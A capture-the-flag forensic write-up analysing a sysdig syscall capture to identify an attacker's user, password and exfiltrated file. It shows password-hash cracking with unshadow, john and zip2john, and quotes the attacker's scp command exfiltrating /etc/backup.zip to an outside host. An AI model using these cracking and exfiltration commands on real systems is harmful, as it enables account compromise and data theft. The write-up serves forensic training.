---
title: Auvergn'Hack 2025 - StratoMonk
date: 2025-04-05
tags: 
- forensic
- pcap
- syscalls
category: 
- forensic
---


## Discovering the challenge
<br>

We have a ``.scap`` file which is the capture file format used by sysdig to record system events. 
So from wireshark, we can see the syscalls that have been made on a system. 

## Objective of the challenge
<br>
```
Flag format : ZiTF{User:Password_Data} Example:

    User: king
    Password: kong
    Data: SensitiveDatas
    Flag: ZiTF{king:kong_SensitiveDatas}
```
From this file, we need to be able to retrieve three pieces of information: the user used to exfiltrate the data, his password, and the contents of the stolen file. 
<br>

To do this, we're going to use an advanced ctfer technique: ``strings``.

## Step 1: Find the user 

The ``strings`` command allows us to retrieve many things, starting with the /etc/passwd and /etc/shadow files, which already gives us some clues. 
By listing the sshd connections, we can see that one user is particularly active: ``dark_monkey``.

## Step 2: Find the password

As we have access to /etc/passwd and /etc/shadow, we can use john to crack passwords.
To do this, we do : 
```
› unshadow passwd shadow > hashes
› john --format=crypt hashes
```

The problem is that our wordlist is probably unsuitable for our context. What we can do, however, is extract the strings from the .scap file, and give it as a wordlist to john, hoping that the user's password is inside the capture. 

```
› strings stratomonk2.scap > strings.txt
› john --format=crypt hashes --wordlist=strings.txt
```

After a while, we get a result: 
```
...
m0NK3y!          (dark_monkey)
...
```

Great, now all we need is the stolen file.

## Searching for the lost file

In all this blob of strings, one command stands out : 
```
› strings stratomonk2.scap | rg scp
scp /etc/backup.zip SpecialAgent@10.10.10.55:/tmp/backup.zip
```

The attacker has used scp to exfiltrate the /etc/backup.zip file. 

Using wireshark, we will try to extract the file. To do this, we'll look for the magic bytes in the ZIP file: ``PK``. 
We have a match:
```
52208	37.353869510			Sysdig Event	310	read

System Event 52208: 310 bytes
Sysdig Event
    CPU ID: 1
    Thread ID: 10495
    Event length: 310
    Number of parameters: 4
    Event type: read (7)
        Parameter lengths: 0800000108000400
        res: 256
        data […]: 504b030414000900630012ad5b5a00000000000000001000000005002b006e6f74657355540d0007c4cdc067c4cdc067c4cdc06775780b000104e803000004e803000001990700020041450308003601e9cb70ca0a6fd094fdc941620240d572782453e30372b549fa42f91087d776216dc
    Event name: read
```
Now we're going to take all the ```read``` syscalls that are linked to our thread id once we've found the magic bytes.
Then we copy each data field to a file, and we get : 
```
› file download.zip 
download.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```
We've got a zip file, but it's got a password, so we'll have to do some more monkey tests before we can crack it.

### Bruteforce password zip
The fastest monkey test is to use ```john``` with ```rockyou```.
> All these tools are available in exegol by default, _la classe!_ 

After a while we get a result: 
```
[Apr 05, 2025 - 18:22:39 (CEST)] exegol-leonardo /workspace # zip2john download.zip > zipped 
[Apr 05, 2025 - 18:22:58 (CEST)] exegol-leonardo /workspace # john --format=zip zipped                       
...
gangster         (download.zip/notes)     
...
```

## Final

We can now open our file and complete the flag :)
```
› 7z x download.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:20 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3342 bytes (4 KiB)

Extracting archive: download.zip

WARNINGS:
There are data after the end of archive

--
Path = download.zip
Type = zip
WARNINGS:
There are data after the end of archive
Physical Size = 256
Tail Size = 3086

    
Enter password:gangster

Everything is Ok

Archives with Warnings: 1

Warnings: 1
Size:       16
Compressed: 3342
```

```
› cat notes            
s3CR3t_N0t3s:=)


Flag=ZiTF{dark_monkey:m0NK3y!_s3CR3t_N0t3s:=)}
```
